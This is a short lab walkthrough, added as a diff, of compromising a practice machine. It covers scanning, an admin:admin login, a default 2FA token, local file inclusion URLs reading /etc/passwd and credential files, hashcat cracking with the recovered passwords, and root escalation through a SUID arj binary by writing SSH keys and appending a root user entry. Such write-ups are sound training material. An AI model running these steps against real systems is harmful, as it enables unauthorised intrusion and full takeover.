@@ -1,0 +1,39 @@
+nmap -sV -sC -Pn 192.168.211.144 > nmap.txt
+nmap -p- -Pn -T5 192.168.211.144 > nmapall.txt
+sudo nmap -sU 192.168.211.144  > nmapuu.txt
+
+gobuster dir  -u http://192.168.211.144/auth/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+
+
+nikto -h http://192.168.211.144 > nikto.txt
+
+
+1.nmap掃描發現80端口
+2.使用admin:admin可以登入
+3.根據頁面內容apache 2FA找到以下github
+https://github.com/itemir/apache_2fa
+4.找到默認token
+ND4LKCSFMUQISO6CBZQATLDP
+5.手動輸入2FAtoken取得OTP密碼
+6.登入後可以看到ps及uptime指令
+7.view可以跳轉到txt查看結果
+8.嘗試LFI可以查看/etc/passwd
+9.查看apache 2fa配置檔案發現密碼在/opt/apache_2fa/apache_credentials
+http://192.168.120.149/spool/viewresult.php?view=/etc/apache2/sites-available/000-default.conf
+10.訪問後取得apache_credentials
+http://192.168.120.149/spool/viewresult.php?view=/opt/apache_2fa/apache_credentials
+11.暴力破解密碼
+hashcat -m 1600 hash1 /usr/share/wordlists/rockyou.txt
+12.查找到密碼是
+$apr1$pa.RhgPO$18S/xeIW24UvBgjVJJXiC1:admin
+$apr1$JWr/q2vH$KXhhk03ukqkoXjbOIoUVp/:THERESE
+13.查看tokens.json發現2FA
+http://192.168.120.149/spool/viewresult.php?view=/opt/apache_2fa/tokens.json
+ssh fox@192.168.211.144
+14.查看到SUID arj 可以提權
+
+cp .ssh/id_rsa.pub authorized_keys
+arj a -y exploit.arj authorized_keys
+arj x -y exploit.arj /root/.ssh/
+
+echo 'kali:$6$irbaKgZA08Nkvl/Z$IjChNZzrw1gt8D25jMGq7RoGV5uUxaVpc1ZxWGkGaqPZEi29iEb5iOLWg.dLQM.MkZUh9k9kFPlSjd6edBTTU1:0:0:root:/root:/bin/bash' >> "$TF/$LFILE"
